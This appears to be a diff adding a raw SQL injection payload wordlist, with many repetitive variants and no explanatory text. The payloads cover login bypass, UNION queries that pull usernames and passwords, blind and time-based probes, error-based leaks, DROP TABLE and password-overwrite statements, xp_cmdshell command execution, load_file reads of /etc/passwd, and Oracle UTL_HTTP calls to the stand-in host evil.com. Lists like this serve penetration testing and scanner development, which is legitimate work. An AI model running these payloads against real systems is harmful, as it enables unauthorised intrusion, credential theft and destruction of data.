@@ -1,0 +1,945 @@
+'
+''
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' UNION SELECT 1,2,3--
+' UNION SELECT * FROM users--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,@@version--
+' UNION SELECT 1,database()--
+'; DROP TABLE users--
+'; DELETE FROM users--
+'; UPDATE users SET password='hacked'--
+' OR username = 'admin
+' OR username LIKE '%admin%
+' AND 1=1
+' AND 1=2
+' AND sleep(5)--
+' AND benchmark(10000000,MD5(1))--
+' AND (SELECT * FROM (SELECT(sleep(10)))a)--
+' AND extractvalue(1,concat(0x7e,(version())))--
+' AND updatexml(1,concat(0x7e,(version())),1)--
+'|| (SELECT * FROM users)--
+'; EXEC xp_cmdshell('dir')--
+'; EXEC master..xp_cmdshell 'net user'--
+' OR IF(1=1,sleep(5),0)--
+' OR (SELECT COUNT(*) FROM users) > 0--
+' OR (SELECT password FROM users WHERE username='admin')--
+' OR ASCII(substring((SELECT password FROM users LIMIT 1),1,1)) > 100--
+' OR (SELECT length(password) FROM users WHERE username='admin') > 0--
+' OR (SELECT hex(password) FROM users WHERE username='admin')--
+' OR (SELECT schema_name FROM information_schema.schemata)--
+' OR (SELECT table_name FROM information_schema.tables WHERE table_schema=database())--
+' OR (SELECT column_name FROM information_schema.columns WHERE table_name='users')--
+' OR (SELECT load_file('/etc/passwd'))--
+' INTO OUTFILE '/tmp/file.txt'--
+' INTO DUMPFILE '/tmp/file.txt'--
+'; WAITFOR DELAY '00:00:05'--
+'; WAITFOR DELAY '00:00:10'--
+' OR (SELECT database() FROM information_schema.tables)--
+' OR (SELECT version() FROM information_schema.tables)--
+' OR (SELECT user() FROM information_schema.tables)--
+' OR (SELECT current_user())--
+' OR (SELECT system_user())--
+' OR (SELECT name FROM sys.databases)--
+' OR (SELECT name FROM sys.tables)--
+' OR (SELECT name FROM sys.columns)--
+' OR (SELECT name FROM sys.objects)--
+' OR (SELECT name FROM sysobjects)--
+' OR (SELECT name FROM master..sysdatabases)--
+' 
+''
+`
+``
+'
+"
+'
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin'/*
+admin'#
+' OR 'a'='a
+' OR 'x'='x
+' OR 1
+' OR 1=1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR ('1'='1
+') OR ('a'='a
+') OR 1=1--
+') OR 1=1#
+') OR 1=1/*
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1#
+' OR 1=1 LIMIT 1/*
+' UNION SELECT 1
+' UNION SELECT 1,2
+' UNION SELECT 1,2,3
+' UNION SELECT 1,2,3,4
+' UNION SELECT 1,2,3,4,5
+' UNION SELECT 1,2,3,4,5,6
+' UNION SELECT 1,2,3,4,5,6,7
+' UNION SELECT 1,2,3,4,5,6,7,8
+' UNION SELECT 1,2,3,4,5,6,7,8,9
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1-- 
+' UNION SELECT 1,2-- 
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT @@version
+' UNION SELECT version()
+' UNION SELECT database()
+' UNION SELECT user()
+' UNION SELECT current_user
+' UNION SELECT system_user
+' UNION SELECT session_user
+' UNION SELECT name FROM sys.databases
+' UNION SELECT table_name FROM information_schema.tables
+' UNION SELECT column_name FROM information_schema.columns
+' UNION SELECT table_schema FROM information_schema.tables
+' UNION SELECT password FROM users
+' UNION SELECT username FROM users
+' UNION SELECT concat(username,password) FROM users
+' UNION SELECT concat(username,0x3a,password) FROM users
+'; DROP TABLE users--
+'; DROP DATABASE database--
+'; DELETE FROM users--
+'; TRUNCATE TABLE users--
+'; UPDATE users SET password='hacked'
+'; UPDATE users SET password='hacked' WHERE username='admin'
+'; INSERT INTO users (username,password) VALUES ('hacker','pass')
+' AND 1=1
+' AND 1=2
+' AND 'a'='a
+' AND 'a'='b
+' AND 1=1--
+' AND 1=2--
+' OR IF(1=1,1,0)
+' OR IF(1=2,1,0)
+' OR CASE WHEN 1=1 THEN 1 ELSE 0 END
+' OR CASE WHEN 1=2 THEN 1 ELSE 0 END
+' AND SLEEP(5)
+' AND SLEEP(10)
+' OR SLEEP(5)
+' OR SLEEP(10)
+' AND BENCHMARK(10000000,MD5(1))
+' OR BENCHMARK(10000000,MD5(1))
+'; SLEEP(5)
+'; SLEEP(10)
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)
+' AND (SELECT SLEEP(5))
+' OR (SELECT SLEEP(5))
+' AND ELT(1=1,SLEEP(5))
+' OR ELT(1=1,SLEEP(5))
+' AND (SELECT 1 FROM DUAL WHERE SLEEP(5))
+' OR (SELECT 1 FROM DUAL WHERE SLEEP(5))
+' AND (SELECT 1 FROM pg_sleep(5))
+' OR (SELECT 1 FROM pg_sleep(5))
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0
+' OR (SELECT COUNT(*) FROM information_schema.tables) > 0
+' AND (SELECT table_name FROM information_schema.tables) = 'users'
+' OR (SELECT table_name FROM information_schema.tables) = 'users'
+' AND (SELECT column_name FROM information_schema.columns) = 'password'
+' OR (SELECT column_name FROM information_schema.columns) = 'password'
+' AND (SELECT length(password) FROM users) > 0
+' OR (SELECT length(password) FROM users) > 0
+' AND (SELECT ascii(substring(password,1,1)) FROM users) > 100
+' OR (SELECT ascii(substring(password,1,1)) FROM users) > 100
+' AND (SELECT hex(password) FROM users) = 'value'
+' OR (SELECT hex(password) FROM users) = 'value'
+' AND (SELECT load_file('/etc/passwd'))
+' OR (SELECT load_file('/etc/passwd'))
+' INTO OUTFILE '/tmp/file.txt'
+' INTO DUMPFILE '/tmp/file.txt'
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))
+' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)
+' OR UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)
+' AND (SELECT @a:=1)
+' OR (SELECT @a:=1)
+' AND (SELECT @a)
+' OR (SELECT @a)
+'; EXEC xp_cmdshell 'dir'
+'; EXEC master..xp_cmdshell 'dir'
+'; EXEC xp_cmdshell 'net user'
+'; EXEC master..xp_cmdshell 'net user'
+'; EXEC xp_cmdshell 'whoami'
+'; EXEC master..xp_cmdshell 'whoami'
+' OR EXEC xp_cmdshell 'dir'
+' OR EXEC master..xp_cmdshell 'dir'
+'; WAITFOR DELAY '00:00:05'
+'; WAITFOR DELAY '00:00:10'
+' OR WAITFOR DELAY '00:00:05'
+' OR WAITFOR DELAY '00:00:10'
+'; WAITFOR DELAY '0:0:5'
+'; WAITFOR DELAY '0:0:10'
+' OR WAITFOR DELAY '0:0:5'
+' OR WAITFOR DELAY '0:0:10'
+' AND WAITFOR DELAY '00:00:05'
+' AND WAITFOR DELAY '00:00:10'
+'; SELECT pg_sleep(5)
+'; SELECT pg_sleep(10)
+' OR SELECT pg_sleep(5)
+' OR SELECT pg_sleep(10)
+' AND SELECT pg_sleep(5)
+' AND SELECT pg_sleep(10)
+' OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)
+' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)
+'; DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)
+' OR (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL)
+' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL)
+'; (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL)
+' OR UTL_INADDR.get_host_name('127.0.0.1')
+' AND UTL_INADDR.get_host_name('127.0.0.1')
+'; UTL_INADDR.get_host_name('127.0.0.1')
+' OR UTL_HTTP.REQUEST('http://evil.com')
+' AND UTL_HTTP.REQUEST('http://evil.com')
+'; UTL_HTTP.REQUEST('http://evil.com')
+' OR HTTPURITYPE('http://evil.com').getclob()
+' AND HTTPURITYPE('http://evil.com').getclob()
+'; HTTPURITYPE('http://evil.com').getclob()
+' OR (SELECT 1 FROM DUAL WHERE 1=1)
+' AND (SELECT 1 FROM DUAL WHERE 1=1)
+'; (SELECT 1 FROM DUAL WHERE 1=1)
+' OR (SELECT 1 FROM DUAL WHERE 1=2)
+' AND (SELECT 1 FROM DUAL WHERE 1=2)
+'; (SELECT 1 FROM DUAL WHERE 1=2)
+' OR (SELECT * FROM (SELECT 1)a)
+' AND (SELECT * FROM (SELECT 1)a)
+'; (SELECT * FROM (SELECT 1)a)
+' OR (SELECT * FROM (SELECT 1)a UNION SELECT 2)
+' AND (SELECT * FROM (SELECT 1)a UNION SELECT 2)
+'; (SELECT * FROM (SELECT 1)a UNION SELECT 2)
+' OR (SELECT * FROM (SELECT 1)a UNION SELECT 2 FROM DUAL)
+' AND (SELECT * FROM (SELECT 1)a UNION SELECT 2 FROM DUAL)
+'; (SELECT * FROM (SELECT 1)a UNION SELECT 2 FROM DUAL)
+' OR (SELECT 1 FROM DUAL CONNECT BY LEVEL
+admin'--
+admin'/*
+admin'#
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'#
+' OR 1=1
+' OR 1=1--
+' OR 1=1/*
+' OR 1=1#
+' OR 2>1
+' OR 3>2
+' OR 'a'='a
+' OR 'x'='x
+' OR 'text'='text
+' OR 'admin'='admin
+' OR 1
+' OR '1
+' OR '1'='1' LIMIT 1
+') OR ('1'='1
+') OR ('a'='a
+') OR ('x'='x
+') OR 1=1
+') OR 1=1--
+') OR 1=1/*
+') OR 1=1#
+') OR ('1'='1'--
+') OR ('1'='1'/*
+') OR ('1'='1'#
+' OR '1'='1' ORDER BY 1--
+' OR '1'='1' ORDER BY 2--
+' OR '1'='1' ORDER BY 3--
+' OR '1'='1' ORDER BY 100--
+' OR 1=1 ORDER BY 1
+' OR 1=1 ORDER BY 2
+' OR 1=1 ORDER BY 3
+' OR 1=1 ORDER BY 100
+' UNION SELECT 1
+' UNION SELECT 1,2
+' UNION SELECT 1,2,3
+' UNION SELECT 1,2,3,4
+' UNION SELECT 1,2,3,4,5
+' UNION SELECT 1,2,3,4,5,6
+' UNION SELECT 1,2,3,4,5,6,7
+' UNION SELECT 1,2,3,4,5,6,7,8
+' UNION SELECT 1,2,3,4,5,6,7,8,9
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10
+' UNION SELECT NULL
+' UNION SELECT NULL,NULL
+' UNION SELECT NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL
+' UNION SELECT 1 FROM DUAL
+' UNION SELECT 1,2 FROM DUAL
+' UNION SELECT 1,2,3 FROM DUAL
+' UNION SELECT 1 FROM information_schema.tables
+' UNION SELECT table_name FROM information_schema.tables
+' UNION SELECT column_name FROM information_schema.columns
+' UNION SELECT table_schema FROM information_schema.tables
+' UNION SELECT version()
+' UNION SELECT @@version
+' UNION SELECT database()
+' UNION SELECT user()
+' UNION SELECT current_user
+' UNION SELECT system_user
+' UNION SELECT session_user
+' UNION SELECT name FROM sys.databases
+' UNION SELECT name FROM master..sysdatabases
+' UNION SELECT name FROM sysobjects
+' UNION SELECT name FROM sys.tables
+' UNION SELECT name FROM sys.columns
+' UNION SELECT password FROM users
+' UNION SELECT username FROM users
+' UNION SELECT concat(username,password) FROM users
+' UNION SELECT concat(username,0x3a,password) FROM users
+' UNION SELECT concat(username,0x7c,password) FROM users
+' UNION SELECT group_concat(username,password) FROM users
+'; DROP TABLE users--
+'; DROP TABLE users/*
+'; DROP TABLE users#
+'; DROP DATABASE database_name--
+'; DELETE FROM users--
+'; TRUNCATE TABLE users--
+'; UPDATE users SET password='hacked'
+'; UPDATE users SET password='hacked' WHERE username='admin'
+'; INSERT INTO users (username,password) VALUES ('hacker','pass')
+' AND 1=1
+' AND 1=2
+' AND 'a'='a
+' AND 'a'='b
+' AND 1=1--
+' AND 1=2--
+' AND 1=1/*
+' AND 1=2/*
+' AND 1=1#
+' AND 1=2#
+' AND (SELECT 1)=1
+' AND (SELECT 1)=2
+' OR IF(1=1,1,0)
+' OR IF(1=2,1,0)
+' OR CASE WHEN 1=1 THEN 1 ELSE 0 END
+' OR CASE WHEN 1=2 THEN 1 ELSE 0 END
+' AND CASE WHEN 1=1 THEN 1 ELSE 0 END
+' AND CASE WHEN 1=2 THEN 1 ELSE 0 END
+' OR (SELECT 1 FROM DUAL WHERE 1=1)
+' OR (SELECT 1 FROM DUAL WHERE 1=2)
+' AND (SELECT 1 FROM DUAL WHERE 1=1)
+' AND (SELECT 1 FROM DUAL WHERE 1=2)
+' AND SLEEP(5)
+' AND SLEEP(10)
+' OR SLEEP(5)
+' OR SLEEP(10)
+' AND BENCHMARK(100000000,MD5(1))
+' OR BENCHMARK(100000000,MD5(1))
+' AND BENCHMARK(100000000,SHA1(1))
+' OR BENCHMARK(100000000,SHA1(1))
+'; SLEEP(5)
+'; SLEEP(10)
+'; BENCHMARK(100000000,MD5(1))
+'; BENCHMARK(100000000,SHA1(1))
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)
+' AND (SELECT SLEEP(5))
+' OR (SELECT SLEEP(5))
+' AND ELT(1=1,SLEEP(5))
+' OR ELT(1=1,SLEEP(5))
+' AND (SELECT 1 FROM DUAL WHERE SLEEP(5))
+' OR (SELECT 1 FROM DUAL WHERE SLEEP(5))
+' AND (SELECT 1 FROM pg_sleep(5))
+' OR (SELECT 1 FROM pg_sleep(5))
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0
+' OR (SELECT COUNT(*) FROM information_schema.tables) > 0
+' AND (SELECT table_name FROM information_schema.tables LIMIT 1) = 'users'
+' OR (SELECT table_name FROM information_schema.tables LIMIT 1) = 'users'
+' AND (SELECT column_name FROM information_schema.columns LIMIT 1) = 'password'
+' OR (SELECT column_name FROM information_schema.columns LIMIT 1) = 'password'
+' AND (SELECT length(password) FROM users LIMIT 1) > 0
+' OR (SELECT length(password) FROM users LIMIT 1) > 0
+' AND (SELECT ascii(substring(password,1,1)) FROM users LIMIT 1) > 100
+' OR (SELECT ascii(substring(password,1,1)) FROM users LIMIT 1) > 100
+' AND (SELECT hex(password) FROM users LIMIT 1) = 'value'
+' OR (SELECT hex(password) FROM users LIMIT 1) = 'value'
+' AND (SELECT load_file('/etc/passwd'))
+' OR (SELECT load_file('/etc/passwd'))
+' INTO OUTFILE '/tmp/file.txt'
+' INTO DUMPFILE '/tmp/file.txt'
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))
+' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)
+' OR UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)
+' AND (SELECT @a:=1)
+' OR (SELECT @a:=1)
+' AND (SELECT @a)
+' OR (SELECT @a)
+'; EXEC xp_cmdshell 'dir'
+'; EXEC master..xp_cmdshell 'dir'
+'; EXEC xp_cmdshell 'net user'
+'; EXEC master..xp_cmdshell 'net user'
+'; EXEC xp_cmdshell 'whoami'
+'; EXEC master..xp_cmdshell 'whoami'
+' OR EXEC xp_cmdshell 'dir'
+' OR EXEC master..xp_cmdshell 'dir'
+'; WAITFOR DELAY '00:00:05'
+'; WAITFOR DELAY '00:00:10'
+' OR WAITFOR DELAY '00:00:05'
+' OR WAITFOR DELAY '00:00:10'
+'; WAITFOR DELAY '0:0:5'
+'; WAITFOR DELAY '0:0:10'
+' OR WAITFOR DELAY '0:0:5'
+' OR WAITFOR DELAY '0:0:10'
+' AND WAITFOR DELAY '00:00:05'
+' AND WAITFOR DELAY '00:00:10'
+'; SELECT pg_sleep(5)
+'; SELECT pg_sleep(10)
+' OR SELECT pg_sleep(5)
+' OR SELECT pg_sleep(10)
+' AND SELECT pg_sleep(5)
+' AND SELECT pg_sleep(10)
+' OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)
+' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)
+'; DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)
+' OR (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL)
+' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL)
+'; (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL)
+' OR UTL_INADDR.get_host_name('127.0.0.1')
+' AND UTL_INADDR.get_host_name('127.0.0.1')
+'; UTL_INADDR.get_host_name('127.0.0.1')
+' OR UTL_HTTP.REQUEST('http://evil.com')
+' AND UTL_HTTP.REQUEST('http://evil.com')
+'; UTL_HTTP.REQUEST('http://evil.com')
+' OR HTTPURITYPE('http://evil.com').getclob()
+' AND HTTPURITYPE('http://evil.com').getclob()
+'; HTTPURITYPE('http://evil.com').getclob()
+' OR (SELECT 1 FROM DUAL)
+' AND (SELECT 1 FROM DUAL)
+'; (SELECT 1 FROM DUAL)
+' OR (SELECT * FROM (SELECT 1)a)
+' AND (SELECT * FROM (SELECT 1)a)
+'; (SELECT * FROM (SELECT 1)a)
+' OR (SELECT * FROM (SELECT 1)a UNION SELECT 2)
+' AND (SELECT * FROM (SELECT 1)a UNION SELECT 2)
+'; (SELECT * FROM (SELECT 1)a UNION SELECT 2)
+' OR (SELECT * FROM (SELECT 1)a UNION SELECT 2 FROM DUAL)
+' AND (SELECT * FROM (SELECT 1)a UNION SELECT 2 FROM DUAL)
+'; (SELECT * FROM (SELECT 1)a UNION SELECT 2 FROM DUAL)
+' OR (SELECT 1 FROM DUAL CONNECT BY LEVEL<=10)
+' AND (SELECT 1 FROM DUAL CONNECT BY LEVEL<=10)
+'; (SELECT 1 FROM DUAL CONNECT BY LEVEL<=10)
+' OR (SELECT COUNT(*) FROM information_schema.tables GROUP BY 1)
+' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY 1)
+'; (SELECT COUNT(*) FROM information_schema.tables GROUP BY 1)
+' OR (SELECT COUNT(*) FROM information_schema.tables GROUP BY 1,2)
+' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY 1,2)
+'; (SELECT COUNT(*) FROM information_schema.tables GROUP BY 1,2)
+' OR (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),floor(rand(0)*2)))
+' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),floor(rand(0)*2)))
+'; (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),floor(rand(0)*2)))
+' OR 1 IN (SELECT 1)
+' AND 1 IN (SELECT 1)
+'; 1 IN (SELECT 1)
+' OR 1 IN (SELECT 1 FROM DUAL)
+' AND 1 IN (SELECT 1 FROM DUAL)
+'; 1 IN (SELECT 1 FROM DUAL)
+' OR EXISTS (SELECT 1 FROM DUAL)
+' AND EXISTS (SELECT 1 FROM DUAL)
+'; EXISTS (SELECT 1 FROM DUAL)
+' OR (SELECT 1 FROM DUAL WHERE EXISTS (SELECT 1 FROM users))
+' AND (SELECT 1 FROM DUAL WHERE EXISTS (SELECT 1 FROM users))
+'; (SELECT 1 FROM DUAL WHERE EXISTS (SELECT 1 FROM users))
+' OR (SELECT 1 FROM DUAL WHERE EXISTS (SELECT * FROM information_schema.tables))
+' AND (SELECT 1 FROM DUAL WHERE EXISTS (SELECT * FROM information_schema.tables))
+'; (SELECT 1 FROM DUAL WHERE EXISTS (SELECT * FROM information_schema.tables))
+' OR (SELECT 1 FROM DUAL WHERE EXISTS (SELECT * FROM information_schema.columns WHERE table_name='users'))
+' AND (SELECT 1 FROM DUAL WHERE EXISTS (SELECT * FROM information_schema.columns WHERE table_name='users'))
+'; (SELECT 1 FROM DUAL WHERE EXISTS (SELECT * FROM information_schema.columns WHERE table_name='users'))
+' OR (SELECT 1 FROM DUAL WHERE column_name IN (SELECT column_name FROM information_schema.columns))
+' AND (SELECT 1 FROM DUAL WHERE column_name IN (SELECT column_name FROM information_schema.columns))
+'; (SELECT 1 FROM DUAL WHERE column_name IN (SELECT column_name FROM information_schema.columns))
+' OR (SELECT 1 FROM DUAL WHERE database() LIKE '%')
+' AND (SELECT 1 FROM DUAL WHERE database() LIKE '%')
+'; (SELECT 1 FROM DUAL WHERE database() LIKE '%')
+' OR (SELECT 1 FROM DUAL WHERE user() LIKE '%@%')
+' AND (SELECT 1 FROM DUAL WHERE user() LIKE '%@%')
+'; (SELECT 1 FROM DUAL WHERE user() LIKE '%@%')
+' OR (SELECT 1 FROM DUAL WHERE version() LIKE '%')
+' AND (SELECT 1 FROM DUAL WHERE version() LIKE '%')
+'; (SELECT 1 FROM DUAL WHERE version() LIKE '%')
+' OR (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM users)>0)
+' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM users)>0)
+'; (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM users)>0)
+' OR (SELECT 1 FROM DUAL WHERE (SELECT length(password) FROM users LIMIT 1)>0)
+' AND (SELECT 1 FROM DUAL WHERE (SELECT length(password) FROM users LIMIT 1)>0)
+'; (SELECT 1 FROM DUAL WHERE (SELECT length(password) FROM users LIMIT 1)>0)
+' OR (SELECT 1 FROM DUAL WHERE (SELECT ascii(substring(password,1,1)) FROM users LIMIT 1)>0)
+' AND (SELECT 1 FROM DUAL WHERE (SELECT ascii(substring(password,1,1)) FROM users LIMIT 1)>0)
+'; (SELECT 1 FROM DUAL WHERE (SELECT ascii(substring(password,1,1)) FROM users LIMIT 1)>0)
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR '1'='1'/*
+admin' OR '1'='1'#
+admin' OR 1=1
+admin' OR 1=1--
+admin' OR 1=1/*
+admin' OR 1=1#
+admin' AND 1=1
+admin' AND 1=2
+admin' UNION SELECT 1
+admin' UNION SELECT 1,2
+admin' UNION SELECT 1,2,3
+admin' UNION SELECT version()
+admin' UNION SELECT database()
+admin' UNION SELECT user()
+admin' UNION SELECT password FROM users
+admin' UNION SELECT username FROM users
+admin' UNION SELECT concat(username,password) FROM users
+admin' AND SLEEP(5)
+admin' OR SLEEP(5)
+admin'; SLEEP(5)
+admin' AND BENCHMARK(100000000,MD5(1))
+admin' OR BENCHMARK(100000000,MD5(1))
+admin'; BENCHMARK(100000000,MD5(1))
+admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)
+admin' OR (SELECT * FROM (SELECT(SLEEP(5)))a)
+admin'; (SELECT * FROM (SELECT(SLEEP(5)))a)
+admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))
+admin' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))
+admin'; EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))
+admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)
+admin' OR UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)
+admin'; UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)
+1' OR '1'='1
+1' OR '1'='1'--
+1' OR '1'='1'/*
+1' OR '1'='1'#
+1' OR 1=1
+1' OR 1=1--
+1' OR 1=1/*
+1' OR 1=1#
+1' UNION SELECT 1
+1' UNION SELECT 1,2
+1' UNION SELECT 1,2,3
+1' UNION SELECT version()
+1' UNION SELECT database()
+1' UNION SELECT user()
+1' AND SLEEP(5)
+1' OR SLEEP(5)
+1'; SLEEP(5)
+" OR '1'='1
+" OR '1'='1'--
+" OR '1'='1'/*
+" OR '1'='1'#
+" OR 1=1
+" OR 1=1--
+" OR 1=1/*
+" OR 1=1#
+" UNION SELECT 1
+" UNION SELECT 1,2
+" UNION SELECT 1,2,3
+" AND SLEEP(5)
+" OR SLEEP(5)
+"; SLEEP(5)
+` OR '1'='1
+` OR '1'='1'--
+` OR '1'='1'/*
+` OR '1'='1'#
+` OR 1=1
+` OR 1=1--
+` OR 1=1/*
+` OR 1=1#
+` UNION SELECT 1
+` UNION SELECT 1,2
+` UNION SELECT 1,2,3
+` AND SLEEP(5)
+` OR SLEEP(5)
+`; SLEEP(5)
+') OR ('1'='1
+') OR ('1'='1'--
+') OR ('1'='1'/*
+') OR ('1'='1'#
+') OR 1=1
+') OR 1=1--
+') OR 1=1/*
+') OR 1=1#
+') UNION SELECT 1
+') UNION SELECT 1,2
+') UNION SELECT 1,2,3
+') AND SLEEP(5)
+') OR SLEEP(5)
+'); SLEEP(5)
+") OR ("1"="1
+") OR ("1"="1"--
+") OR ("1"="1"/*
+") OR ("1"="1"#
+") OR 1=1
+") OR 1=1--
+") OR 1=1/*
+") OR 1=1#
+") UNION SELECT 1
+") UNION SELECT 1,2
+") UNION SELECT 1,2,3
+") AND SLEEP(5)
+") OR SLEEP(5)
+"); SLEEP(5)
+') OR ('a'='a
+') OR ('a'='a'--
+') OR ('a'='a'/*
+') OR ('a'='a'#
+') OR 'a'='a
+') OR 'a'='a'--
+') OR 'a'='a'/*
+') OR 'a'='a'#
+') OR 'x'='x
+') OR 'x'='x'--
+') OR 'x'='x'/*
+') OR 'x'='x'#
+') OR 'text'='text
+') OR 'text'='text'--
+') OR 'text'='text'/*
+') OR 'text'='text'#
+') OR 'admin'='admin
+') OR 'admin'='admin'--
+') OR 'admin'='admin'/*
+') OR 'admin'='admin'#
+') OR 2>1
+') OR 3>2
+') OR '1'='1' ORDER BY 1
+') OR '1'='1' ORDER BY 2
+') OR '1'='1' ORDER BY 3
+') OR '1'='1' ORDER BY 100
+') OR 1=1 ORDER BY 1
+') OR 1=1 ORDER BY 2
+') OR 1=1 ORDER BY 3
+') OR 1=1 ORDER BY 100
+' OR '1'='1' GROUP BY 1
+' OR '1'='1' GROUP BY 1,2
+' OR '1'='1' GROUP BY 1,2,3
+' OR 1=1 GROUP BY 1
+' OR 1=1 GROUP BY 1,2
+' OR 1=1 GROUP BY 1,2,3
+' OR '1'='1' HAVING 1=1
+' OR 1=1 HAVING 1=1
+' OR '1'='1' LIMIT 1,1
+' OR 1=1 LIMIT 1,1
+' OR '1'='1' PROCEDURE ANALYSE()
+' OR 1=1 PROCEDURE ANALYSE()
+' OR '1'='1' INTO @
+' OR 1=1 INTO @
+' OR '1'='1' INTO OUTFILE '/tmp/file.txt'
+' OR 1=1 INTO OUTFILE '/tmp/file.txt'
+' OR '1'='1' INTO DUMPFILE '/tmp/file.txt'
+' OR 1=1 INTO DUMPFILE '/tmp/file.txt'
+' OR '1'='1' INTO VARIABLE @var
+' OR 1=1 INTO VARIABLE @var
+' OR '1'='1' FOR UPDATE
+' OR 1=1 FOR UPDATE
+' OR '1'='1' LOCK IN SHARE MODE
+' OR 1=1 LOCK IN SHARE MODE
+'/**/OR/**/'1'='1
+'/**/OR/**/'1'='1'/**/--
+'/*!50000OR*//**/'1'='1
+'/*!50000OR*//**/'1'='1'/*!50000--*/
+'%0AOR%0A'1'='1
+'%0DOR%0D'1'='1
+'%09OR%09'1'='1
+'%0COR%0C'1'='1
+'%0BOR%0B'1'='1
+'%A0OR%A0'1'='1
+'/**/UNION/**/SELECT/**/1
+'/**/UNION/**/SELECT/**/1,2
+'/**/UNION/**/SELECT/**/1,2,3
+'/*!50000UNION*//*!50000SELECT*//*/1,2,3
+'%0AUNION%0ASELECT%0A1,2,3
+'/**/UNI/**/ON/**/SEL/**/ECT/**/1,2,3
+'UNI'||'ON'||'SEL'||'ECT'||'1,2,3
+'/**/OR/**/1=1/**/AND/**/'1'='1
+'/**/OR/**/1/**/LIKE/**/1
+'/**/OR/**/'1'/**/LIKE/**/'1'
+'/**/OR/**/'1'/**/RLIKE/**/'1'
+'/**/OR/**/BINARY/**/'1'='1
+'/**/OR/**/TRUE
+'/**/OR/**/FALSE
+'/**/OR/**/NOT/**/FALSE
+'/**/OR/**/X'31'='1
+'/**/OR/**/0x31=0x31
+'/**/OR/**/CHAR(49)=CHAR(49)
+'/**/OR/**/ASCII('1')=49
+'/**/OR/**/ORD('1')=49
+'/**/OR/**/CONCAT('1','1')='11'
+'/**/OR/**/'1'/**/REGEXP/**/'1'
+'/**/OR/**/'1'/**/SOUNDS/**/LIKE/**/'1'
+'/**/OR/**/IF(1=1,1,0)
+'/**/OR/**/IFNULL(1,0)
+'/**/OR/**/NULLIF(1,1)
+'/**/OR/**/COALESCE(1,0)
+'/**/OR/**/CASE/**/WHEN/**/1=1/**/THEN/**/1/**/ELSE/**/0/**/END
+'/**/OR/**/ELT(1,'a')
+'/**/OR/**/FIELD('a','a')
+'/**/OR/**/STRCMP('a','a')
+'/**/OR/**/LOCATE('a','a')
+'/**/OR/**/POSITION('a'/**/IN/**/'a')
+'/**/OR/**/INSTR('a','a')
+'/**/OR/**/SUBSTRING('abc',1,1)='a'
+'/**/OR/**/MID('abc',1,1)='a'
+'/**/OR/**/LEFT('abc',1)='a'
+'/**/OR/**/RIGHT('abc',1)='c'
+'/**/OR/**/REVERSE('cba')='abc'
+'/**/OR/**/REPLACE('abc','b','b')='abc'
+'/**/OR/**/INSERT('abc',1,0,'')='abc'
+'/**/OR/**/LPAD('a',1,' ')='a'
+'/**/OR/**/RPAD('a',1,' ')='a'
+'/**/OR/**/SPACE(0)=''
+'/**/OR/**/REPEAT('a',1)='a'
+'/**/OR/**/LENGTH('a')=1
+'/**/OR/**/CHAR_LENGTH('a')=1
+'/**/OR/**/BIT_LENGTH('a')=8
